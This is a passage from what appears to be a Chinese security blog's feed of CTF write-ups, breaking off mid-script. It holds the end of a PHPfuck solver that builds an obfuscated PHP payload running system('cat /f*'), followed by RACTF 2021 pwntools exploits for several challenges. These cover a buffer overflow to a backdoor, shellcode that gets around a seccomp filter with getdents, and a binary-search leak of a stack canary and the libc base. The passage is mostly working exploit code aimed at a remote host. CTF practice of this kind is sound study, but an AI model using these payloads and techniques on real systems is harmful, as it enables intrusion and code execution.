class="comment">#print(ret)</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line">    <span class="comment">#print(result)</span></span><br><span class="line">def guess_chr():</span><br><span class="line">    <span class="keyword">global</span> int_num</span><br><span class="line">    num=int_num</span><br><span class="line">    I_test=&#123;&#125;</span><br><span class="line">    N_test=&#123;&#125;</span><br><span class="line">    F_test=&#123;&#125;</span><br><span class="line">    want=<span class="string">'chr'</span></span><br><span class="line">    want=want.upper()</span><br><span class="line">    num_int=num.keys()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> x in num_int:</span><br><span class="line">        <span class="keyword">for</span> y in num_int:</span><br><span class="line">                k=(chr(ord(<span class="string">'I'</span>)^ord(x)^ord(y)))</span><br><span class="line">                <span class="keyword">if</span> I_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                     I_test[k]=(x)+<span class="string">'^'</span>+(y)</span><br><span class="line">                k=(chr(ord(<span class="string">'N'</span>)^ord(x)^ord(y)))</span><br><span class="line">                <span class="keyword">if</span> N_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                     N_test[k]=(x)+<span class="string">'^'</span>+(y)</span><br><span class="line">                k=(chr(ord(<span class="string">'F'</span>)^ord(x)^ord(y)))</span><br><span class="line">                <span class="keyword">if</span> F_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                     F_test[k]=(x)+<span class="string">'^'</span>+(y)</span><br><span class="line">    <span class="keyword">for</span> x in num_int:</span><br><span class="line">       </span><br><span class="line">                k=(chr(ord(<span class="string">'I'</span>)^ord(x)))</span><br><span class="line">                <span class="keyword">if</span> I_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                    I_test[k.upper()]=(x)</span><br><span class="line">                k=(chr(ord(<span class="string">'N'</span>)^ord(x)))</span><br><span class="line">                <span class="keyword">if</span> N_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                    N_test[k.upper()]=(x)</span><br><span class="line">                k=(chr(ord(<span class="string">'F'</span>)^ord(x)))</span><br><span class="line">                <span class="keyword">if</span> F_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                     F_test[k.upper()]=(x)</span><br><span class="line">    <span class="keyword">if</span> I_test.has_key(want[<span class="number">0</span>])== <span class="keyword">False</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">'I not much'</span>)</span><br><span class="line">            <span class="keyword">exit</span>()</span><br><span class="line">   </span><br><span class="line">           </span><br><span class="line">    <span class="keyword">if</span> N_test.has_key(want[<span class="number">1</span>])== <span class="keyword">False</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">'N not much'</span>)</span><br><span class="line">            <span class="keyword">exit</span>()</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> F_test.has_key(want[<span class="number">2</span>])== <span class="keyword">False</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">'F not much'</span>)</span><br><span class="line">            <span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(F_test)</span></span><br><span class="line">    <span class="keyword">return</span> chrstr(I_test[want[<span class="number">0</span>]],N_test[want[<span class="number">1</span>]],F_test[want[<span class="number">2</span>]])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def guess(want):</span><br><span class="line">    <span class="keyword">global</span> int_num</span><br><span class="line">    want=str(ord(want))</span><br><span class="line">    ret=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i in want:</span><br><span class="line">        ret+=int_num[i]+<span class="string">'.'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret[:<span class="number">-1</span>]</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">def shell(fun,code):<span class="comment">#有参数函数</span></span><br><span class="line">    ret=<span class="string">''</span></span><br><span class="line">    sym=[<span class="string">'('</span>,<span class="string">'^'</span>,<span class="string">'.'</span>,<span class="string">')'</span>]</span><br><span class="line">    <span class="keyword">global</span> chr_str</span><br><span class="line">    <span class="keyword">for</span> i in fun:</span><br><span class="line">        </span><br><span class="line">            ret+=chr_str+<span class="string">'('</span>+guess(i)+<span class="string">').'</span></span><br><span class="line">            </span><br><span class="line">    ret=<span class="string">"("</span>+ret[:<span class="number">-1</span>]+<span class="string">')(('</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> x in code:</span><br><span class="line">        </span><br><span class="line">            ret+=chr_str+<span class="string">'('</span>+guess(x)+<span class="string">').'</span></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">    ret=ret[:<span class="number">-1</span>]+<span class="string">'))'</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">def code(xx):<span class="comment">#无差数函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x in xx:</span><br><span class="line">        </span><br><span class="line">            ret+=chr_str+<span class="string">'('</span>+guess(x)+<span class="string">').'</span></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">    ret=ret[:<span class="number">-1</span>]+<span class="string">'))'</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    num=init()</span><br><span class="line">    int_num=one_num(num)</span><br><span class="line">    chr_str=guess_chr()</span><br><span class="line">    x=(shell(<span class="string">'assert'</span>,<span class="string">'system("cat /f*")'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span>(x)</span><br><span class="line">    <span class="keyword">print</span>(len(x))</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>勉强完成出解题的脚本，但是一直在思考一个问题.在高版本php中,assert和eval是不可作为可变函数的,那么还有没有什么方法来进行代码执行.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;2021_uiuctf中出了一道jali题PHPfuck,题目要求用5种字符构造出php shellcode,感觉很有意思便记录下来。</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="web" scheme="lexsd6.github.io/tags/web/"/>
    
    <category term="php" scheme="lexsd6.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>ractf2021-pwn-ctf</title>
    <link href="lexsd6.github.io/2021/08/17/ractf2021-pwn-ctf/"/>
    <id>lexsd6.github.io/2021/08/17/ractf2021-pwn-ctf/</id>
    <published>2021-08-17T15:07:16.917Z</published>
    <updated>2021-08-17T16:21:36.003Z</updated>
    
    <content type="html"><![CDATA[<p>周末小打了下ractf,get 到了一些 小姿势,于是小记下避免搞忘了。<a id="more"></a></p><h2 id="archer"><a href="#archer" class="headerlink" title="archer"></a>archer</h2><p>简单的变量覆盖…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libcfind</span><br><span class="line"></span><br><span class="line">elf=<span class="string">'archer'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">p=remote(<span class="string">'193.57.159.27'</span>,<span class="number">49723</span>)</span><br><span class="line"><span class="comment">#p=process(elf)</span></span><br><span class="line">p.sendline(<span class="string">'yes1'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">'-fbf98'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2winrars"><a href="#ret2winrars" class="headerlink" title="ret2winrars"></a>ret2winrars</h2><p>签到，elf内自带后门。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libcfind</span><br><span class="line"></span><br><span class="line">elf=<span class="string">'./ret2winrars'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">p=remote(<span class="string">'193.57.159.27'</span>,<span class="number">30527</span>)</span><br><span class="line"><span class="comment">#process(elf)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="number">0x20</span>*<span class="string">'1'</span>+<span class="string">'2'</span>*<span class="number">8</span>+p64(<span class="number">0x000000000401166</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="notsimple"><a href="#notsimple" class="headerlink" title="notsimple"></a>notsimple</h2><p>很有意思的一道题,flag是文件名，同时seccomp 禁用execve所以无法使用命令执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch</span><br><span class="line"> 0001: 0x15 0x00 0x0b 0xc000003e  if (A !&#x3D; ARCH_X86_64) goto 0013</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number</span><br><span class="line"> 0003: 0x35 0x09 0x00 0x40000000  if (A &gt;&#x3D; 0x40000000) goto 0013</span><br><span class="line"> 0004: 0x15 0x08 0x00 0x0000003b  if (A &#x3D;&#x3D; execve) goto 0013</span><br><span class="line"> 0005: 0x15 0x07 0x00 0x00000142  if (A &#x3D;&#x3D; execveat) goto 0013</span><br><span class="line"> 0006: 0x15 0x06 0x00 0x00000101  if (A &#x3D;&#x3D; openat) goto 0013</span><br><span class="line"> 0007: 0x15 0x05 0x00 0x00000003  if (A &#x3D;&#x3D; close) goto 0013</span><br><span class="line"> 0008: 0x15 0x04 0x00 0x00000055  if (A &#x3D;&#x3D; creat) goto 0013</span><br><span class="line"> 0009: 0x15 0x03 0x00 0x00000086  if (A &#x3D;&#x3D; uselib) goto 0013</span><br><span class="line"> 0010: 0x15 0x02 0x00 0x00000039  if (A &#x3D;&#x3D; fork) goto 0013</span><br><span class="line"> 0011: 0x15 0x01 0x00 0x0000003a  if (A &#x3D;&#x3D; vfork) goto 0013</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>但是经过查阅资料后发现，<code>ls</code>的底层是依赖系统调用<code>getdents</code>.</p><p>所以我们可以<code>getdents</code>系统来读取文件目录.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line">e=ELF(<span class="string">'./notsimple'</span>)</span><br><span class="line"><span class="comment">#p=process('./notsimple')</span></span><br><span class="line">p=remote(<span class="string">'193.57.159.27'</span>,<span class="number">46343</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Oops, I'm leaking!"</span>)</span><br><span class="line">addr=int(p.recvline(),<span class="number">16</span>)</span><br><span class="line">log.info(hex(addr))</span><br><span class="line"></span><br><span class="line">addr2=addr+<span class="number">0x400</span></span><br><span class="line">shell=asm(<span class="string">"""</span></span><br><span class="line"><span class="string">mov rsi,  %s;</span></span><br><span class="line"><span class="string"> mov rdx, 0x800;</span></span><br><span class="line"><span class="string"> mov rdi, 0x0;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x0;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> mov rax,%s;</span></span><br><span class="line"><span class="string"> jmp rax;</span></span><br><span class="line"><span class="string">"""</span>%(hex(addr2),hex(addr2)))</span><br><span class="line">print(len(shell))</span><br><span class="line"></span><br><span class="line">p.sendline(shell+(<span class="number">0x50</span>-len(shell))*<span class="string">'1'</span>+p64(<span class="number">0</span>)+p64(addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">addr3=addr+<span class="number">0x1000</span></span><br><span class="line">shell2=asm(<span class="string">"""</span></span><br><span class="line"><span class="string">mov rsi,  %s;</span></span><br><span class="line"><span class="string"> mov rdx, 0x80;</span></span><br><span class="line"><span class="string"> mov rdi, 0x0;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x0;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> mov rsi, %s;</span></span><br><span class="line"><span class="string"> mov rdx, 0x8;</span></span><br><span class="line"><span class="string"> mov rdi, 0x1;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x1;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string">  mov rdi, %s;</span></span><br><span class="line"><span class="string"> mov rdx, 0x0;</span></span><br><span class="line"><span class="string"> mov rsi, 0x10000;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x2;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string">mov rdi, rax ;// fd</span></span><br><span class="line"><span class="string">mov rsi, %s ;// buf</span></span><br><span class="line"><span class="string">mov edx, 1024 ;// count</span></span><br><span class="line"><span class="string">mov rax, 78 ;// SYS_getdents</span></span><br><span class="line"><span class="string"> syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> mov rsi, %s;</span></span><br><span class="line"><span class="string"> mov rdx, 0x680;</span></span><br><span class="line"><span class="string"> mov rdi, 0x1;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x1;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> mov rdi, 0 ;// exit</span></span><br><span class="line"><span class="string">mov rax, 60;</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">"""</span>%(hex(addr3),hex(addr3),hex(addr3),hex(addr3),hex(addr3)))</span><br><span class="line"></span><br><span class="line">p.sendline(shell2)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">p.sendline(<span class="string">'/pwn\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="guessing"><a href="#guessing" class="headerlink" title="guessing"></a>guessing</h2><p>有意思的一道题,在我们只有8次猜中数字的机会但是我们要猜出canary和libc基地址，一共16个数字。</p><p>我们可以通过<code>256== 2**8</code>的特性在7次猜测下大概在通过大小推理出任意一个数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guss</span><span class="params">(nums)</span>:</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    depth = <span class="number">0</span></span><br><span class="line">    addition = <span class="number">0</span></span><br><span class="line">    count=<span class="number">0</span></span><br><span class="line">    canary2=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        my_guess = <span class="number">0x100</span> // <span class="number">2</span> + addition</span><br><span class="line">        <span class="comment">#print('my_guess: '+str(my_guess))</span></span><br><span class="line">        depth += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> my_guess&lt;nums[i]:</span><br><span class="line">            <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">                my_guess += <span class="number">1</span></span><br><span class="line">                canary2 += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">                print(<span class="string">'low get!'</span>+str(my_guess))</span><br><span class="line">                <span class="comment">#print(hex(canary))</span></span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                depth = <span class="number">0</span></span><br><span class="line">                addition = <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                addition += <span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">elif</span> my_guess&gt;nums[i]:</span><br><span class="line">            <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">                my_guess -= <span class="number">1</span></span><br><span class="line">                canary2 += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">            <span class="comment"># print(hex(canary))</span></span><br><span class="line">                print(<span class="string">'high get!'</span>+str(my_guess))</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                depth = <span class="number">0</span></span><br><span class="line">                addition = <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                addition += <span class="number">-1</span> * (<span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            canary2 += (<span class="number">0x10</span> ** ( <span class="number">2</span> * i)) * my_guess</span><br><span class="line">            <span class="comment">#print(hex(canary))</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            depth = <span class="number">0</span></span><br><span class="line">            addition = <span class="number">0</span></span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'samlle get!'</span>+str(my_guess))</span><br><span class="line">            <span class="comment">#print('one true')</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">n=[<span class="number">111</span>,<span class="number">34</span>,<span class="number">155</span>,<span class="number">33</span>,<span class="number">23</span>,<span class="number">55</span>,<span class="number">32</span>,<span class="number">90</span>]</span><br><span class="line"></span><br><span class="line">guss(n)</span><br></pre></td></tr></table></figure><p>从而在8次内尽可能得到16位数字。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#target = process('./guess')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target=process(<span class="string">'./guess'</span>)<span class="comment">#remote('193.57.159.27', 55206)</span></span><br><span class="line">elf = ELF(<span class="string">'./guess'</span>)</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">c = CDLL(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">c.srand((c.time(<span class="number">0</span>)))</span><br><span class="line">x=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    k=c.rand()</span><br><span class="line">    k=k%<span class="number">255</span></span><br><span class="line">    x.append(k)</span><br><span class="line">    print(hex(k))</span><br><span class="line">print(x)</span><br><span class="line">i = <span class="number">1</span></span><br><span class="line">depth = <span class="number">0</span></span><br><span class="line">addition = <span class="number">0</span></span><br><span class="line">canary = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    print(target.recvuntil(<span class="string">b'(0-7)?'</span>))</span><br><span class="line">    target.sendline(str(<span class="number">0x20</span> + i).encode(<span class="string">'ascii'</span>))</span><br><span class="line">    print(target.recvuntil(<span class="string">b'guess:'</span>))</span><br><span class="line">    my_guess = <span class="number">0x100</span> // <span class="number">2</span> + addition</span><br><span class="line">    <span class="comment">#print(hex(my_guess))</span></span><br><span class="line">    target.sendline(str(my_guess).encode(<span class="string">'ascii'</span>))</span><br><span class="line">    result = target.recvuntil(<span class="string">b'Which'</span>)</span><br><span class="line">    depth += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'low'</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">            my_guess += <span class="number">1</span></span><br><span class="line">            canary += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">            <span class="comment">#print(hex(canary))</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            depth = <span class="number">0</span></span><br><span class="line">            addition = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            addition += <span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b'high'</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">            my_guess -= <span class="number">1</span></span><br><span class="line">            canary += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">           <span class="comment"># print(hex(canary))</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            depth = <span class="number">0</span></span><br><span class="line">            addition = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            addition += <span class="number">-1</span> * (<span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        canary += (<span class="number">0x10</span> ** ( <span class="number">2</span> * i)) * my_guess</span><br><span class="line">        <span class="comment">#print(hex(canary))</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        depth = <span class="number">0</span></span><br><span class="line">        addition = <span class="number">0</span></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        print(<span class="string">'one true'</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(canary)</span><br><span class="line"><span class="comment">#target.interactive()</span></span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">depth = <span class="number">0</span></span><br><span class="line">addition = <span class="number">0</span></span><br><span class="line">libc_start = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    print(target.recvuntil(<span class="string">b'(0-7)?'</span>))</span><br><span class="line">    target.sendline(str(<span class="number">0x30</span> + i).encode(<span class="string">'ascii'</span>))</span><br><span class="line">    print(target.recvuntil(<span class="string">b'guess:'</span>))</span><br><span class="line">    my_guess = <span class="number">0x100</span> // <span class="number">2</span> + addition</span><br><span class="line">    <span class="comment">#print(hex(my_guess))</span></span><br><span class="line">    target.sendline(str(my_guess).encode(<span class="string">'ascii'</span>))</span><br><span class="line">    result = target.recvuntil(<span class="string">b'Which'</span>)</span><br><span class="line">    depth += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'low'</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">            my_guess += <span class="number">1</span></span><br><span class="line">            libc_start += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">            <span class="comment">#print(hex(canary))</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            depth = <span class="number">0</span></span><br><span class="line">            addition = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            addition += <span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b'high'</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">            my_guess -= <span class="number">1</span></span><br><span class="line">            